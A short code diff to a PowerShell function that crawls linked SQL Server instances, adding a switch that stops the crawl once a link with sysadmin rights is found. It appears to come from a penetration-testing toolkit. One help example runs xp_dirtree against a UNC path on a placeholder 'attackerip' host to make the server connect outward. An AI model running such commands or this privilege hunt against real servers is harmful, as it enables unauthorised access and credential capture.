@@ -15230,6 +15230,8 @@ Function Get-SQLServerLinkCrawl{
     Link to run SQL query on.
     .PARAMETER MaxDepth
     Max crawl depth.
+    .PARAMETER StopOnSysAdmin
+    Stop crawl upon finding a SysAdmin link.
     .PARAMETER Export
     Convert collected data to exportable format.
     .Example
@@ -15250,8 +15252,11 @@ Function Get-SQLServerLinkCrawl{
     Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "exec xp_dirtree 'c:\temp'" -Export | format-table
     Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "exec xp_dirtree '\\attackerip\file'" -Export | format-table
     .Example
-     Crawl linked servers and return a list of databases for each one, then export to a to text objects for reporting.
+    Crawl linked servers and return a list of databases for each one, then export to a to text objects for reporting.
     Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "select name from master..sysdatabases" -Export | where name -ne "broken link" | sort name |  Format-Table
+    .EXAMPLE
+    Crawl linked servers up to a depth of 2, stopping upon finding a SysAdmin.
+    Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -MaxDepth 2 -StopOnSysAdmin
     #>
     [CmdletBinding()]
     Param(
@@ -15292,6 +15297,10 @@ Function Get-SQLServerLinkCrawl{
         [Parameter(Mandatory=$false,
         HelpMessage="Max crawl depth.")]
         [int]$MaxDepth,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Stop crawl upon finding a SysAdmin link.")]
+        [Switch]$StopOnSysAdmin,
 
         [Parameter(Mandatory=$false,
         HelpMessage="Convert collected data to exportable format.")]
@@ -15345,6 +15354,11 @@ Function Get-SQLServerLinkCrawl{
                     Write-Verbose " - Link IsSysAdmin: $($Server.Sysadmin)"
                     Write-Verbose " - Link Count: $($Server.Links.Count)"                    
                     Write-Verbose " - Links on this server: $($Server.Links -join ', ')"
+
+                    if ($StopOnSysAdmin -and $Server.Sysadmin -eq 1) {
+                        Write-Verbose "Found a SysAdmin, stopping..."
+                        return $Server
+                    }
                 }   
             } 
         }
